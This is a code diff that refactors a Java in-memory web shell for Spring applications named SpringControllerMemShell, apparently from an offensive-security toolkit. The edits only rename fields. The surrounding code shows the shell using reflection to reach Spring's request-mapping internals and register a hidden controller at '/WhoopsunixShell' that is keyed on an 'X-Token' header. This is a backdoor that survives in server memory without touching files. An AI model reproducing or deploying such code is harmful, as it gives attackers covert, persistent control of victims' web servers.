@@ -22,9 +22,9 @@ import java.util.Map;
  * [2.2.x, 2.7.x]
  */
 public class SpringControllerMemShell {
-    private static String pattern = "/WhoopsunixShell";
+    private static String PATTERN = "/WhoopsunixShell";
     private static String NAME = "Whoopsunix";
-    private static String header = "X-Token";
+    private static String HEADER = "X-Token";
 
     public SpringControllerMemShell(String s) {
     }
@@ -46,7 +46,7 @@ public class SpringControllerMemShell {
             List<String> urls = new ArrayList();
             while (urlIterator.hasNext()) {
                 String urlPath = (String) urlIterator.next();
-                if (SpringControllerMemShell.pattern.equals(urlPath)) {
+                if (PATTERN.equals(urlPath)) {
                     return;
                 }
             }
@@ -56,7 +56,7 @@ public class SpringControllerMemShell {
             Field configField = mapping.getClass().getDeclaredField("config");
             configField.setAccessible(true);
             RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration)configField.get(mapping);
-            RequestMappingInfo requestMappingInfo = RequestMappingInfo.paths(new String[]{SpringControllerMemShell.pattern}).options(config).build();
+            RequestMappingInfo requestMappingInfo = RequestMappingInfo.paths(new String[]{PATTERN}).options(config).build();
 
             // 避免循环
             SpringControllerMemShell springControllerMemShell = new SpringControllerMemShell(NAME);
@@ -76,7 +76,7 @@ public class SpringControllerMemShell {
             Object request = clazz.getMethod("getRequest").invoke(object);
             Object response = clazz.getMethod("getResponse").invoke(object);
             java.lang.reflect.Method method = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.http.HttpServletRequest").getDeclaredMethod("getHeader", String.class);
-            String header = (String) method.invoke(request, "X-Token");
+            String header = (String) method.invoke(request, HEADER);
             method = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.ServletResponse").getDeclaredMethod("getWriter");
             Object writer = method.invoke(response);
 
